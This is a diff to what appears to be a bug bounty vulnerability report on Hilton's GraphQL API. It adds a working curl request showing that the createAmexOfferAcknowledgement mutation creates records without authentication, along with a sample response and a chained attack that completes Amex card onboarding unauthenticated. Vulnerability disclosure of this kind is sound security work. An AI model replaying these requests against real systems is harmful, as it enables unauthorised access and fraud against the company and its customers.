@@ -132,6 +132,39 @@ Key observations:
 
 ---
 
+## Additional: createAmexOfferAcknowledgement Executes Without Auth
+
+A second Amex-related mutation, `createAmexOfferAcknowledgement`, **also executes without authentication**:
+
+```bash
+curl -s "https://www.hilton.com/graphql/customer" \
+  -X POST -H "Content-Type: application/json" \
+  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
+  -d '{
+    "operationName": "amexAck",
+    "query": "mutation amexAck($id: String!) { createAmexOfferAcknowledgement(applicantRequestTrackingId: $id) { _id error { code message } } }",
+    "variables": {"id": "attacker-controlled-id"}
+  }'
+```
+
+**Response (HTTP 200, `dx-completeness: 1`):**
+```json
+{
+  "data": {
+    "createAmexOfferAcknowledgement": {
+      "_id": "46b0261e098f2ebd0998...",
+      "error": null
+    }
+  }
+}
+```
+
+Every call generates a new unique `_id` and `error: null` — confirming the mutation succeeds and creates records in the Hilton-Amex integration system without requiring an authenticated Hilton session.
+
+**Combined impact**: An attacker can (1) generate valid Amex acquisition JWTs via `amexSessionToken`, (2) inject arbitrary `token_id` values, and (3) acknowledge offers for arbitrary tracking IDs — completing the Amex card application onboarding flow entirely without authentication, bypassing the intended requirement of being an authenticated Hilton Honors member.
+
+---
+
 ## Additional: Realm Disclosure via amexPrefill Error
 
 When calling `amexPrefill(guestId: 100000000)` without auth, the error response reveals the resolved backend realm:
